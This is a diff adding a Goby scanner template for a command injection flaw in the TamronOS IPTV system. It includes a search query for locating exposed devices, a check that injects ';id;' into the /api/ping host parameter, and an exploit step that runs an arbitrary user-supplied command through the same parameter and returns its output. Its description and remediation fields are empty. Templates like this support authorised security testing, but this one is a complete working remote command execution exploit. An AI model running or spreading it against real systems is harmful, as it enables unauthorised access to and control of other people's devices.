@@ -1,0 +1,96 @@
+{
+      "Name": "TamronOS IPTV系统存在前台命令执行漏洞",
+      "Level": "3",
+      "Tags": [],
+      "GobyQuery": "title=\"TamronOS IPTV系统\"",
+      "Description": "",
+      "Product": "",
+      "Homepage": "https://gobies.org/",
+      "Author": "luckying",
+      "Impact": "",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "https://gobies.org/"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "cmd",
+			"type": "input",
+			"value": "id",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/api/ping?count=5&host=;id;&port=80&source=1.1.1.1&type=icmp",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "uid=",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/api/ping?count=5&host=;{{{cmd}}};&port=80&source=1.1.1.1&type=icmp",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "uid=",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-06-15 20:25:10",
+      "GobyVersion": "1.8.268"
+}
